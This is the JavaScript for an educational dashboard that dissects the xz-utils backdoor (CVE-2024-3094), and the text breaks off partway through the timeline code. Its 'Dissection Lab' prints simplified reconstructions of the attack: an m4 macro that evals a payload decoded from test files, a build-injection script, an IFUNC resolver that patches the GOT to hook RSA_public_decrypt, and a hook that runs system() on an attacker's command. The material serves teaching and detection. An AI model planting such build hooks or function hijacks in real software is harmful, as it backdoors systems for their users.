/* ============================================================
   XZ-Bot Dashboard — Interactive JavaScript
   ============================================================ */

document.addEventListener('DOMContentLoaded', () => {
    initParticles();
    initTabs();
    loadAttackFlow();
    loadTimeline();
    initScanner();
    initDissect();
    initReplay();
    initEntropy();
    initTrustGraph();
    initQuiz();
    initCompare();
    initMemoryMap();
    initReportExport();
    initThemeToggle();
    initKeyboardShortcuts();
});

/* ============================================================
   PARTICLE BACKGROUND
   ============================================================ */
function initParticles() {
    const canvas = document.getElementById('particles');
    const ctx = canvas.getContext('2d');
    let particles = [];
    const PARTICLE_COUNT = 60;

    function resize() {
        canvas.width = window.innerWidth;
        canvas.height = window.innerHeight;
    }
    resize();
    window.addEventListener('resize', resize);

    for (let i = 0; i < PARTICLE_COUNT; i++) {
        particles.push({
            x: Math.random() * canvas.width,
            y: Math.random() * canvas.height,
            vx: (Math.random() - 0.5) * 0.3,
            vy: (Math.random() - 0.5) * 0.3,
            size: Math.random() * 2 + 0.5,
            opacity: Math.random() * 0.3 + 0.1,
        });
    }

    function draw() {
        ctx.clearRect(0, 0, canvas.width, canvas.height);

        particles.forEach(p => {
            p.x += p.vx;
            p.y += p.vy;
            if (p.x < 0) p.x = canvas.width;
            if (p.x > canvas.width) p.x = 0;
            if (p.y < 0) p.y = canvas.height;
            if (p.y > canvas.height) p.y = 0;

            ctx.beginPath();
            ctx.arc(p.x, p.y, p.size, 0, Math.PI * 2);
            ctx.fillStyle = `rgba(88, 166, 255, ${p.opacity})`;
            ctx.fill();
        });

        // Draw connections
        for (let i = 0; i < particles.length; i++) {
            for (let j = i + 1; j < particles.length; j++) {
                const dx = particles[i].x - particles[j].x;
                const dy = particles[i].y - particles[j].y;
                const dist = Math.sqrt(dx * dx + dy * dy);
                if (dist < 120) {
                    ctx.beginPath();
                    ctx.moveTo(particles[i].x, particles[i].y);
                    ctx.lineTo(particles[j].x, particles[j].y);
                    ctx.strokeStyle = `rgba(88, 166, 255, ${0.06 * (1 - dist / 120)})`;
                    ctx.lineWidth = 0.5;
                    ctx.stroke();
                }
            }
        }

        requestAnimationFrame(draw);
    }
    draw();
}

/* ============================================================
   TAB NAVIGATION
   ============================================================ */
function initTabs() {
    document.querySelectorAll('.tab').forEach(tab => {
        tab.addEventListener('click', () => {
            document.querySelectorAll('.tab').forEach(t => t.classList.remove('active'));
            document.querySelectorAll('.tab-content').forEach(c => c.classList.remove('active'));
            tab.classList.add('active');
            const section = document.getElementById(tab.dataset.tab);
            section.classList.add('active');
        });
    });
}

/* ============================================================
   ATTACK FLOW
   ============================================================ */
function loadAttackFlow() {
    fetch('/api/stages')
        .then(r => r.json())
        .then(stages => {
            const diagram = document.getElementById('flow-diagram');
            diagram.innerHTML = '';
            stages.forEach((stage, i) => {
                if (i > 0) {
                    const arrow = document.createElement('div');
                    arrow.className = 'flow-arrow';
                    arrow.innerHTML = `<svg viewBox="0 0 32 16"><path d="M0 8 L24 8" stroke="#30363d" stroke-width="2" fill="none"/><path d="M20 4 L28 8 L20 12" stroke="#58a6ff" stroke-width="2" fill="none"/></svg>`;
                    diagram.appendChild(arrow);
                }
                const node = document.createElement('div');
                node.className = 'flow-node';
                node.style.animationDelay = `${i * 0.1}s`;
                node.innerHTML = `
                    <div class="node-number">${stage.order}</div>
                    <div class="node-title">${stage.name}</div>
                `;
                node.addEventListener('click', () => showStageDetail(stage, node));
                diagram.appendChild(node);
            });
        });
}

function showStageDetail(stage, node) {
    document.querySelectorAll('.flow-node').forEach(n => n.classList.remove('selected'));
    node.classList.add('selected');

    const panel = document.getElementById('stage-detail');
    const indicatorsHtml = stage.indicators.map(i => `<li>${escHtml(i)}</li>`).join('');
    const mitigationsHtml = stage.mitigations.map(m => `<li>${escHtml(m)}</li>`).join('');

    panel.innerHTML = `
        <div class="detail-header">
            <span class="stage-badge">STAGE ${stage.order}</span>
            <h3>${escHtml(stage.name)}</h3>
        </div>
        <div class="detail-body">
            <p>${escHtml(stage.description)}</p>
            <h4>Technical Detail</h4>
            <div class="tech-block">${escHtml(stage.technical_detail)}</div>
            <h4>Indicators of Compromise</h4>
            <ul>${indicatorsHtml}</ul>
            <h4>Mitigations</h4>
            <ul>${mitigationsHtml}</ul>
        </div>
    `;
    panel.style.animation = 'none';
    panel.offsetHeight; // trigger reflow
    panel.style.animation = 'fadeIn 0.4s ease';
}

/* ============================================================
   SCANNER — Animated multi-agent scan
   ============================================================ */
const AGENTS = ['supply_chain', 'backdoor', 'obfuscation', 'social_engineering'];
const AGENT_LABELS = {
    supply_chain: 'Supply Chain',
    backdoor: 'Backdoor',
    obfuscation: 'Obfuscation',
    social_engineering: 'Social Eng',
};

function initScanner() {
    document.getElementById('scan-btn').addEventListener('click', () => {
        const path = document.getElementById('scan-path').value.trim();
        runScan(path);
    });
    document.getElementById('scan-samples-btn').addEventListener('click', () => {
        runScan('');
    });
    document.querySelectorAll('.filter-btn').forEach(btn => {
        btn.addEventListener('click', () => {
            document.querySelectorAll('.filter-btn').forEach(b => b.classList.remove('active'));
            btn.classList.add('active');
            filterFindings(btn.dataset.filter);
        });
    });
}

function resetAgentCards() {
    AGENTS.forEach(agent => {
        const card = document.querySelector(`.agent-card[data-agent="${agent}"]`);
        card.className = 'agent-card glass';
        document.getElementById(`status-${agent}`).textContent = 'IDLE';
        document.getElementById(`status-${agent}`).className = 'agent-status';
        document.getElementById(`progress-${agent}`).style.width = '0%';
        document.getElementById(`findings-${agent}`).textContent = '--';
    });
}

function runScan(targetPath) {
    const scanBtn = document.getElementById('scan-btn');
    const btnText = scanBtn.querySelector('.btn-text');
    const btnSpinner = scanBtn.querySelector('.btn-spinner');
    const activityFeed = document.getElementById('activity-feed');
    const feedLog = document.getElementById('feed-log');
    const results = document.getElementById('scan-results');

    // Reset UI
    resetAgentCards();
    scanBtn.disabled = true;
    document.getElementById('scan-samples-btn').disabled = true;
    btnText.style.display = 'none';
    btnSpinner.style.display = 'inline-block';
    activityFeed.style.display = 'flex';
    results.style.display = 'none';
    feedLog.innerHTML = '';

    addFeedEntry('orchestrator', 'Initializing agentic scan pipeline...');

    // Simulate progressive agent activity while real scan runs
    const scanPromise = fetch('/api/scan', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ target_path: targetPath }),
    }).then(r => r.json());

    simulateAgentProgress(scanPromise);
}

async function simulateAgentProgress(scanPromise) {
    const phases = [
        { agent: 'supply_chain', msgs: [
            'Walking build system files...',
            'Scanning Makefile, configure.ac...',
            'Checking m4 macros for injection patterns...',
            'Analyzing post-install hooks...',
        ]},
        { agent: 'backdoor', msgs: [
            'Scanning C/C++ source files...',
            'Checking for IFUNC resolver abuse...',
            'Analyzing dlsym/RTLD_NEXT patterns...',
            'Checking GOT/PLT manipulation...',
            'Flagging RSA_public_decrypt hooks...',
        ]},
        { agent: 'obfuscation', msgs: [
            'Computing Shannon entropy for test fixtures...',
            'Checking for multi-layer deobfuscation pipelines...',
            'Analyzing base64/hex encoding patterns...',
        ]},
        { agent: 'social_engineering', msgs: [
            'Loading git commit history...',
            'Analyzing contributor trust progression...',
            'Checking for sockpuppet pressure patterns...',
            'Evaluating scope escalation timeline...',
        ]},
    ];

    let scanData = null;

    // Animate each agent
    for (const phase of phases) {
        const card = document.querySelector(`.agent-card[data-agent="${phase.agent}"]`);
        const statusEl = document.getElementById(`status-${phase.agent}`);
        const progressEl = document.getElementById(`progress-${phase.agent}`);

        card.classList.add('scanning');
        statusEl.textContent = 'SCANNING';
        statusEl.className = 'agent-status active';

        for (let i = 0; i < phase.msgs.length; i++) {
            addFeedEntry(AGENT_LABELS[phase.agent], phase.msgs[i]);
            progressEl.style.width = `${((i + 1) / phase.msgs.length) * 100}%`;
            await sleep(300 + Math.random() * 200);
        }

        card.classList.remove('scanning');
        card.classList.add('done');
        statusEl.textContent = 'COMPLETE';
        statusEl.className = 'agent-status complete';
        progressEl.style.width = '100%';
    }

    // Cross-reference phase
    addFeedEntry('orchestrator', 'Cross-referencing findings across agents...');
    document.getElementById('feed-status').textContent = 'Cross-referencing...';

    for (const agent of AGENTS) {
        const card = document.querySelector(`.agent-card[data-agent="${agent}"]`);
        const statusEl = document.getElementById(`status-${agent}`);
        card.classList.remove('done');
        card.classList.add('xref');
        statusEl.textContent = 'XREF';
        statusEl.className = 'agent-status xref';
        await sleep(200);
    }

    await sleep(400);

    addFeedEntry('orchestrator', 'Correlating IFUNC + crypto function patterns...', 'critical');
    await sleep(300);
    addFeedEntry('orchestrator', 'Correlating obfuscated data + build injection...', 'critical');
    await sleep(300);
    addFeedEntry('orchestrator', 'Correlating backdoor code + supply chain injection...', 'critical');
    await sleep(200);

    // Wait for actual scan to finish
    try {
        scanData = await scanPromise;
    } catch (err) {
        alert('Scan failed: ' + err.message);
        return;
    }

    // Update agent finding counts
    if (scanData.agent_reports) {
        for (const [name, count] of Object.entries(scanData.agent_reports)) {
            const el = document.getElementById(`findings-${name}`);
            if (el) animateCount(el, count);
        }
    }

    addFeedEntry('orchestrator', `Scan complete. Risk score: ${scanData.risk_score.toFixed(1)}/10`, scanData.risk_score >= 8 ? 'critical' : 'finding');
    document.getElementById('feed-status').textContent = 'Complete';
    document.getElementById('feed-status').style.animation = 'none';

    // Re-enable buttons
    document.getElementById('scan-btn').disabled = false;
    document.getElementById('scan-samples-btn').disabled = false;
    const btnText = document.getElementById('scan-btn').querySelector('.btn-text');
    const btnSpinner = document.getElementById('scan-btn').querySelector('.btn-spinner');
    btnText.style.display = 'inline';
    btnSpinner.style.display = 'none';

    // Show results with animation
    renderScanResults(scanData);
}

function addFeedEntry(agent, msg, severity) {
    const log = document.getElementById('feed-log');
    const entry = document.createElement('div');
    const now = new Date();
    const time = `${now.getMinutes().toString().padStart(2, '0')}:${now.getSeconds().toString().padStart(2, '0')}.${now.getMilliseconds().toString().padStart(3, '0').slice(0, 2)}`;
    entry.className = `feed-entry${severity ? ' ' + severity : ''}`;
    entry.innerHTML = `
        <span class="feed-time">${time}</span>
        <span class="feed-agent">[${escHtml(agent)}]</span>
        <span class="feed-msg">${escHtml(msg)}</span>
    `;
    log.appendChild(entry);
    log.scrollTop = log.scrollHeight;
}

function renderScanResults(data) {
    const results = document.getElementById('scan-results');
    results.style.display = 'block';
    results.style.animation = 'fadeIn 0.5s ease';

    // Animate gauge
    animateGauge(data.risk_score);

    // Severity bars
    renderSeverityBars(data.severity_counts || {});

    // Category rings
    renderCategoryRings(data.findings || []);

    // Findings count
    document.getElementById('findings-count').textContent = data.total_findings;

    // Findings table
    renderFindingsTable(data.findings || []);
}

function animateGauge(score) {
    const arc = document.getElementById('gauge-arc');
    const scoreText = document.getElementById('gauge-score');
    const labelText = document.getElementById('gauge-label');
    const maxDash = 251.2;
    const targetDash = (score / 10) * maxDash;

    let labels = ['LOW RISK', 'MEDIUM RISK', 'HIGH RISK', 'CRITICAL'];
    let label = score <= 3 ? labels[0] : score <= 6 ? labels[1] : score <= 8 ? labels[2] : labels[3];

    const duration = 1500;
    const start = performance.now();

    function animate(now) {
        const elapsed = now - start;
        const progress = Math.min(elapsed / duration, 1);
        const eased = 1 - Math.pow(1 - progress, 3); // ease-out cubic
        const current = eased * score;
        arc.setAttribute('stroke-dasharray', `${(current / 10) * maxDash} ${maxDash}`);
        scoreText.textContent = current.toFixed(1);
        if (progress < 1) requestAnimationFrame(animate);
        else labelText.textContent = label;
    }
    requestAnimationFrame(animate);
}

function renderSeverityBars(counts) {
    const container = document.getElementById('severity-bars');
    const levels = [
        { key: 'critical', label: 'Critical', color: '#da3633' },
        { key: 'high', label: 'High', color: '#f85149' },
        { key: 'medium', label: 'Medium', color: '#d29922' },
        { key: 'low', label: 'Low', color: '#388bfd' },
        { key: 'info', label: 'Info', color: '#8b949e' },
    ];

    const maxCount = Math.max(...Object.values(counts), 1);
    container.innerHTML = levels.map(lev => {
        const count = counts[lev.key] || 0;
        const pct = (count / maxCount) * 100;
        return `
            <div class="sev-row">
                <span class="sev-name" style="color:${lev.color}">${lev.label}</span>
                <div class="sev-bar-track">
                    <div class="sev-bar-fill" style="background:${lev.color};width:${pct}%"></div>
                </div>
                <span class="sev-count" style="color:${lev.color}">${count}</span>
            </div>
        `;
    }).join('');

    // Animate bars in after a tick
    setTimeout(() => {
        container.querySelectorAll('.sev-bar-fill').forEach(bar => {
            bar.style.transition = 'width 0.8s cubic-bezier(0.4, 0, 0.2, 1)';
        });
    }, 50);
}

function renderCategoryRings(findings) {
    const cats = {};
    findings.forEach(f => {
        cats[f.category] = (cats[f.category] || 0) + 1;
    });

    const total = findings.length || 1;
    const colors = {
        supply_chain: '#d29922',
        backdoor: '#f85149',
        obfuscation: '#a371f7',
        social_engineering: '#58a6ff',
    };

    const container = document.getElementById('category-rings');
    container.innerHTML = Object.entries(cats).map(([cat, count]) => {
        const pct = count / total;
        const circumference = 2 * Math.PI * 22;
        const dashLen = pct * circumference;
        const color = colors[cat] || '#8b949e';
        return `
            <div class="cat-ring">
                <svg class="cat-ring-svg" viewBox="0 0 56 56">
                    <circle cx="28" cy="28" r="22" class="cat-ring-track"/>
                    <circle cx="28" cy="28" r="22" class="cat-ring-fill" stroke="${color}" stroke-dasharray="${dashLen} ${circumference}"/>
                </svg>
                <div class="cat-ring-count" style="color:${color}">${count}</div>
                <div class="cat-ring-label">${cat.replace('_', ' ')}</div>
            </div>
        `;
    }).join('');
}

let allFindings = [];

function renderFindingsTable(findings) {
    allFindings = findings;
    const tbody = document.getElementById('findings-body');
    tbody.innerHTML = '';

    findings.forEach((f, i) => {
        const row = document.createElement('tr');
        row.className = 'expandable';
        row.dataset.severity = f.severity;
        row.innerHTML = `
            <td><span class="sev-badge sev-${f.severity}">${f.severity}</span></td>
            <td>${escHtml(f.rule_id)}</td>
            <td>${escHtml(f.category)}</td>
            <td>${escHtml(f.title)}</td>
            <td>${f.file_path ? escHtml(f.file_path.split('/').pop()) : '-'}</td>
            <td>${f.line_number || '-'}</td>
        `;
        row.addEventListener('click', () => {
            const ev = document.getElementById(`evidence-${i}`);
            if (ev) ev.classList.toggle('show');
        });
        tbody.appendChild(row);

        const evRow = document.createElement('tr');
        evRow.className = 'evidence-row';
        evRow.id = `evidence-${i}`;
        evRow.dataset.severity = f.severity;
        evRow.innerHTML = `
            <td colspan="6" class="evidence-cell">
                <strong>${escHtml(f.description)}</strong>
                <code>${escHtml(f.evidence)}</code>
                <em>Recommendation: ${escHtml(f.recommendation)}</em>
            </td>
        `;
        tbody.appendChild(evRow);
    });
}

function filterFindings(filter) {
    const rows = document.querySelectorAll('#findings-body tr');
    rows.forEach(row => {
        if (filter === 'all' || row.dataset.severity === filter) {
            row.style.display = '';
        } else {
            row.style.display = 'none';
        }
    });
}

/* ============================================================
   DISSECTION LAB
   ============================================================ */
const DISSECT_LAYERS = [
    {
        title: 'Layer 1: Build System Injection',
        filename: 'build-to-host.m4',
        lang: 'm4',
        code: [
            { n: 1, text: '# build-to-host.m4 — LEGITIMATE GNU macro', cls: 'comment' },
            { n: 2, text: 'AC_DEFUN([gl_BUILD_TO_HOST],', cls: '' },
            { n: 3, text: '[', cls: '' },
            { n: 4, text: '  gl_cv_host_os=$(uname -s)', cls: '' },
            { n: 5, text: '', cls: '' },
            { n: 6, text: '  # --- INJECTED PAYLOAD (tarball only) ---', cls: 'highlight-line comment' },
            { n: 7, text: '  if test -f tests/files/bad-3-corrupt_lzma2.xz; then', cls: 'highlight-line danger' },
            { n: 8, text: '    eval $(sed "s/-.*//" tests/files/bad-3-corrupt_lzma2.xz \\', cls: 'highlight-line danger' },
            { n: 9, text: '      | tr "\\t \\-_" " \\t_\\-" \\', cls: 'highlight-line danger' },
            { n: 10, text: '      | head -c 7966 \\', cls: 'highlight-line danger' },
            { n: 11, text: '      | xz -d 2>/dev/null)', cls: 'highlight-line danger' },
            { n: 12, text: '  fi', cls: 'highlight-line danger' },
            { n: 13, text: '', cls: '' },
            { n: 14, text: '  gl_cv_build_to_host="$gl_cv_host_os"', cls: '' },
            { n: 15, text: '])', cls: '' },
        ],
        explain: `<p>The attack begins in the <strong>autotools build system</strong>. A modified m4 macro in <code>build-to-host.m4</code> was only present in release tarballs, not in the git repository.</p>
<p>This is the first stage of a multi-layer extraction pipeline:</p>
<div class="step"><span class="step-num">1.</span> The macro checks for a "test fixture" file</div>
<div class="step"><span class="step-num">2.</span> <code>sed</code> strips header bytes from the disguised payload</div>
<div class="step"><span class="step-num">3.</span> <code>tr</code> performs character substitution to restore original bytes</div>
<div class="step"><span class="step-num">4.</span> <code>head -c 7966</code> extracts exactly the right number of bytes</div>
<div class="step"><span class="step-num">5.</span> <code>xz -d</code> decompresses the LZMA-compressed payload</div>
<div class="step"><span class="step-num">6.</span> <code>eval</code> executes the resulting shell script</div>`,
        ioc: [
            'Tarball contents differ from git repository',
            'Shell pipeline in m4 macro: sed | tr | head | xz -d',
            'eval() of dynamically generated code in build scripts',
            'References to test fixture files in build logic',
        ],
    },
    {
        title: 'Layer 2: Payload Extraction Pipeline',
        filename: 'extracted_stage1.sh',
        lang: 'bash',
        code: [
            { n: 1, text: '#!/bin/bash', cls: '' },
            { n: 2, text: '# Stage 1 extracted script (deobfuscated)', cls: 'comment' },
            { n: 3, text: '', cls: '' },
            { n: 4, text: '# Activation guards — only triggers on target systems', cls: 'comment' },
            { n: 5, text: 'if [ "$(uname)" != "Linux" ]; then exit 0; fi', cls: 'highlight-line' },
            { n: 6, text: 'if [ "$(uname -m)" != "x86_64" ]; then exit 0; fi', cls: 'highlight-line' },
            { n: 7, text: 'if [ -n "$TERM" ]; then exit 0; fi  # skip interactive', cls: 'highlight-line danger' },
            { n: 8, text: '', cls: '' },
            { n: 9, text: '# Extract second-stage payload from test fixture', cls: 'comment' },
            { n: 10, text: 'payload_file="tests/files/good-large_compressed.lzma"', cls: 'highlight-line danger' },
            { n: 11, text: '', cls: '' },
            { n: 12, text: '# Multi-step deobfuscation of embedded object code', cls: 'comment' },
            { n: 13, text: 'xz -dc "$payload_file" | {', cls: 'highlight-line danger' },
            { n: 14, text: '  head -c "$offset" > /dev/null', cls: 'highlight-line danger' },
            { n: 15, text: '  head -c "$size" > liblzma_la-crc64-fast.o', cls: 'highlight-line danger' },
            { n: 16, text: '}', cls: 'highlight-line' },
            { n: 17, text: '', cls: '' },
            { n: 18, text: '# Inject compiled object into build', cls: 'comment' },
            { n: 19, text: 'cp liblzma_la-crc64-fast.o "$builddir/.libs/"', cls: 'highlight-line danger' },
        ],
        explain: `<p>The extracted shell script is a <strong>7-layer matryoshka</strong> (nesting doll) of obfuscation. Each layer peels back to reveal the next.</p>
<p>Key anti-analysis features:</p>
<div class="step"><span class="step-num">1.</span> <strong>OS guard:</strong> Only runs on Linux x86_64</div>
<div class="step"><span class="step-num">2.</span> <strong>Interactive guard:</strong> Skips if TERM is set (avoids developer machines)</div>
<div class="step"><span class="step-num">3.</span> <strong>Test fixture disguise:</strong> Payload hidden in "test data" files</div>
<div class="step"><span class="step-num">4.</span> <strong>Offset extraction:</strong> Uses exact byte offsets to extract ELF object</div>
<div class="step"><span class="step-num">5.</span> <strong>Build injection:</strong> Replaces legitimate crc64-fast.o with backdoored version</div>
<p>The test files had entropy of <strong>~7.99 bits/byte</strong> (near-maximum), compared to ~6.8 for legitimate LZMA test data.</p>`,
        ioc: [
            'Files with Shannon entropy > 7.5 bits/byte',
            'Byte-exact extraction with head -c',
            'Self-referential decompression (xz decoding itself)',
            'Object file replacement in build directory',
            'Conditional exit based on TERM environment variable',
        ],
    },
    {
        title: 'Layer 3: IFUNC Resolver Hijack',
        filename: 'crc64_fast.c',
        lang: 'c',
        code: [
            { n: 1, text: '#include <lzma.h>', cls: '' },
            { n: 2, text: '#include <dlfcn.h>', cls: '' },
            { n: 3, text: '', cls: '' },
            { n: 4, text: '/* Normal IFUNC — selects CRC implementation */', cls: 'comment' },
            { n: 5, text: 'static crc64_func_t crc64_resolve(void) {', cls: 'safe-line' },
            { n: 6, text: '    if (__builtin_cpu_supports("clmul"))', cls: 'safe-line' },
            { n: 7, text: '        return crc64_clmul;', cls: 'safe-line' },
            { n: 8, text: '    return crc64_generic;', cls: 'safe-line' },
            { n: 9, text: '}', cls: '' },
            { n: 10, text: '', cls: '' },
            { n: 11, text: '/* BACKDOORED IFUNC — also patches GOT */', cls: 'highlight-line comment' },
            { n: 12, text: 'static crc64_func_t crc64_resolve(void) {', cls: 'highlight-line' },
            { n: 13, text: '    if (__builtin_cpu_supports("clmul"))', cls: 'highlight-line' },
            { n: 14, text: '        _backdoor_init();  // <-- INJECTED', cls: 'highlight-line danger' },
            { n: 15, text: '    return crc64_clmul;', cls: 'highlight-line' },
            { n: 16, text: '}', cls: '' },
            { n: 17, text: '', cls: '' },
            { n: 18, text: 'void _backdoor_init(void) {', cls: 'highlight-line' },
            { n: 19, text: '    /* Walk GOT to find RSA_public_decrypt */', cls: 'highlight-line comment' },
            { n: 20, text: '    void **got = find_got_entry("RSA_public_decrypt");', cls: 'highlight-line danger' },
            { n: 21, text: '    original_rsa = *got;', cls: 'highlight-line danger' },
            { n: 22, text: '    *got = backdoor_rsa_public_decrypt;', cls: 'highlight-line danger' },
            { n: 23, text: '}', cls: '' },
        ],
        explain: `<p><strong>GNU IFUNC</strong> (Indirect Function) is a legitimate mechanism for selecting optimized function implementations at load time, before <code>main()</code> runs.</p>
<p>The backdoor abuses this by adding GOT (Global Offset Table) patching to the IFUNC resolver:</p>
<div class="step"><span class="step-num">1.</span> Dynamic linker calls <code>crc64_resolve()</code> during library load</div>
<div class="step"><span class="step-num">2.</span> Resolver runs <code>_backdoor_init()</code> before any security tools start</div>
<div class="step"><span class="step-num">3.</span> Init walks the GOT to find <code>RSA_public_decrypt</code> in libcrypto</div>
<div class="step"><span class="step-num">4.</span> Replaces the pointer with <code>backdoor_rsa_public_decrypt</code></div>
<div class="step"><span class="step-num">5.</span> All future calls to RSA_public_decrypt are now intercepted</div>
<p>This works because <strong>sshd loads liblzma via libsystemd</strong>, and the IFUNC runs before sshd's own initialization.</p>`,
        ioc: [
            'IFUNC resolver that does more than CPU feature detection',
            'GOT/PLT modifications from within a compression library',
            'Cross-library function pointer replacement',
            'Code executing before main() via IFUNC',
        ],
    },
    {
        title: 'Layer 4: RSA Hook & Crypto Abuse',
        filename: 'backdoor_rsa.c',
        lang: 'c',
        code: [
            { n: 1, text: '/* Hooked RSA_public_decrypt — replaces OpenSSL\'s */', cls: 'comment' },
            { n: 2, text: 'int backdoor_rsa_public_decrypt(', cls: 'highlight-line' },
            { n: 3, text: '    int flen, const uint8_t *from,', cls: 'highlight-line' },
            { n: 4, text: '    uint8_t *to, RSA *rsa, int padding)', cls: 'highlight-line' },
            { n: 5, text: '{', cls: '' },
            { n: 6, text: '    /* Extract attacker payload from RSA modulus */', cls: 'highlight-line comment' },
            { n: 7, text: '    BIGNUM *n = RSA_get0_n(rsa);', cls: 'highlight-line danger' },
            { n: 8, text: '    uint8_t *modulus = BN_bn2bin(n);', cls: 'highlight-line danger' },
            { n: 9, text: '', cls: '' },
            { n: 10, text: '    /* Verify Ed448 signature from attacker */', cls: 'comment' },
            { n: 11, text: '    if (!verify_ed448(modulus, attacker_pubkey))', cls: 'highlight-line danger' },
            { n: 12, text: '        return original_rsa(flen, from, to, rsa, padding);', cls: 'highlight-line' },
            { n: 13, text: '', cls: '' },
            { n: 14, text: '    /* Decrypt command with ChaCha20 */', cls: 'comment' },
            { n: 15, text: '    uint8_t *cmd = chacha20_decrypt(modulus + 64);', cls: 'highlight-line danger' },
            { n: 16, text: '', cls: '' },
            { n: 17, text: '    /* Execute as root (sshd runs as root) */', cls: 'highlight-line comment' },
            { n: 18, text: '    system(cmd);  // PRE-AUTH RCE', cls: 'highlight-line danger' },
            { n: 19, text: '', cls: '' },
            { n: 20, text: '    return original_rsa(flen, from, to, rsa, padding);', cls: '' },
            { n: 21, text: '}', cls: '' },
        ],
        explain: `<p>The hooked <code>RSA_public_decrypt</code> inspects every SSH certificate presented during authentication. When it finds the attacker's signature, it executes a hidden command.</p>
<div class="step"><span class="step-num">1.</span> SSH client sends certificate with crafted RSA modulus (N field)</div>
<div class="step"><span class="step-num">2.</span> Hooked function extracts payload from the modulus bytes</div>
<div class="step"><span class="step-num">3.</span> <strong>Ed448</strong> signature verifies the payload is from the attacker (not random data)</div>
<div class="step"><span class="step-num">4.</span> <strong>ChaCha20</strong> decrypts the embedded command</div>
<div class="step"><span class="step-num">5.</span> <code>system()</code> executes the command as root</div>
<p>Using Ed448 + ChaCha20 (not in standard SSH) means the backdoor is <strong>cryptographically authenticated</strong> — only the attacker can trigger it.</p>`,
        ioc: [
            'RSA_public_decrypt hooked in compression library',
            'Ed448 signature verification (unusual for SSH)',
            'ChaCha20 decryption in non-TLS context',
            'system() call from within crypto path',
        ],
    },
    {
        title: 'Layer 5: Pre-Auth Remote Code Execution',
        filename: 'kill_chain.txt',
        lang: 'diagram',
        code: [
            { n: 1, text: '  ATTACKER                        TARGET (sshd)', cls: 'comment' },
            { n: 2, text: '  --------                        --------------', cls: 'comment' },
            { n: 3, text: '', cls: '' },
            { n: 4, text: '  1. Craft SSH certificate', cls: '' },
            { n: 5, text: '     +---------------------------+', cls: '' },
            { n: 6, text: '     | RSA Modulus (N field):     |', cls: 'highlight-line' },
            { n: 7, text: '     |  [Ed448 sig][ChaCha20 cmd]|', cls: 'highlight-line danger' },
            { n: 8, text: '     +---------------------------+', cls: 'highlight-line' },
            { n: 9, text: '', cls: '' },
            { n: 10, text: '  2. SSH connect -------------------------------->', cls: '' },
            { n: 11, text: '                                   sshd receives cert', cls: '' },
            { n: 12, text: '', cls: '' },
            { n: 13, text: '  3. sshd calls RSA_public_decrypt()', cls: '' },
            { n: 14, text: '     (actually calls backdoor_rsa_public_decrypt)', cls: 'highlight-line danger' },
            { n: 15, text: '', cls: '' },
            { n: 16, text: '  4. Backdoor verifies Ed448 signature', cls: 'highlight-line' },
            { n: 17, text: '     Backdoor decrypts ChaCha20 payload', cls: 'highlight-line' },
            { n: 18, text: '     Backdoor calls system("attacker_cmd")', cls: 'highlight-line danger' },
            { n: 19, text: '', cls: '' },
            { n: 20, text: '  5. RESULT: Pre-auth RCE as root', cls: 'highlight-line danger' },
            { n: 21, text: '     CVE-2024-3094 | CVSS 10.0 | CRITICAL', cls: 'highlight-line danger' },
            { n: 22, text: '', cls: '' },
            { n: 23, text: '  DISCOVERED: Andres Freund (Microsoft)', cls: 'safe-line' },
            { n: 24, text: '  Noticed 500ms SSH login delay due to CPU usage', cls: 'safe-line' },
            { n: 25, text: '  from the backdoor code running in hot path', cls: 'safe-line' },
        ],
        explain: `<p>The complete kill chain results in <strong>CVE-2024-3094</strong>, rated <strong>CVSS 10.0 Critical</strong> — pre-authentication remote code execution as root on any system running the affected sshd.</p>
<div class="step"><span class="step-num">1.</span> Attacker connects to SSH with a specially crafted certificate</div>
<div class="step"><span class="step-num">2.</span> The RSA modulus carries an Ed448-signed, ChaCha20-encrypted command</div>
<div class="step"><span class="step-num">3.</span> The hooked RSA_public_decrypt runs <strong>before authentication</strong></div>
<div class="step"><span class="step-num">4.</span> Command executes as root (sshd privilege level)</div>
<div class="step"><span class="step-num">5.</span> Normal SSH handshake continues — no visible error</div>
<p><strong>Discovery:</strong> Andres Freund at Microsoft noticed a <strong>500ms delay</strong> in SSH logins on a Debian testing machine. He traced the CPU overhead to liblzma and uncovered the entire backdoor. A performance regression saved the internet.</p>`,
        ioc: [
            'Unusual SSH authentication latency (~500ms)',
            'SSH certificates with abnormal RSA modulus sizes',
            'system() calls during pre-auth SSH phase',
            'Ed448/ChaCha20 usage in SSH code path',
            'liblzma loaded into sshd process space',
        ],
    },
];

function initDissect() {
    document.querySelectorAll('.layer-btn').forEach(btn => {
        btn.addEventListener('click', () => {
            document.querySelectorAll('.layer-btn').forEach(b => b.classList.remove('active'));
            btn.classList.add('active');
            renderDissectLayer(parseInt(btn.dataset.layer));
        });
    });
    renderDissectLayer(0);
}

function renderDissectLayer(idx) {
    const layer = DISSECT_LAYERS[idx];

    document.getElementById('dissect-filename').textContent = layer.filename;
    document.getElementById('dissect-lang').textContent = layer.lang;
    document.getElementById('dissect-title').textContent = layer.title;
    document.getElementById('dissect-body').innerHTML = layer.explain;

    // Code block
    const codeBlock = document.getElementById('dissect-codeblock');
    codeBlock.innerHTML = layer.code.map(line => {
        const cls = line.cls || '';
        const spanCls = cls.includes('comment') ? 'comment' :
                        cls.includes('danger') ? 'danger' :
                        cls.includes('keyword') ? 'keyword' : '';
        const wrapCls = cls.includes('highlight-line') ? 'highlight-line' :
                        cls.includes('safe-line') ? 'safe-line' : '';

        const content = `<span class="line-num">${line.n}</span><span class="${spanCls}">${escHtml(line.text)}</span>`;
        if (wrapCls) {
            return `<span class="${wrapCls}">${content}\n</span>`;
        }
        return content + '\n';
    }).join('');

    // IOC list
    const iocList = document.getElementById('dissect-ioc-list');
    iocList.innerHTML = layer.ioc.map(i => `<li>${escHtml(i)}</li>`).join('');
}

/* ============================================================
   TIMELINE
   ============================================================ */
function loadTimeline() {
    fetch('/api/timeline')
        .then(r => r.json())
        .then(events => {
            const container = document.getElementById('timeline-container');
            container.innerHTML = '';
            let lastPhase = '';
            events.forEach((event, i) => {
                const el = document.createElement('div');
                el.className = `timeline-event ${event.phase}`;
                el.style.animationDelay = `${i * 0.08}s`;

                let phaseLabel = '';
                if (event.phase !== lastPhase) {
                    const phaseNames = {
                        trust_building: 'Trust Building',
                        injection: 'Injection',
                        exploitation: 'Exploitation',
                        discovery: 'Discovery',
                    };
                    phaseLabel = `<span class="timeline-phase-label ${event.phase}">${phaseNames[event.phase] || event.phase}</span>`;
                    lastPhase = event.phase;
                }

                el.innerHTML = `
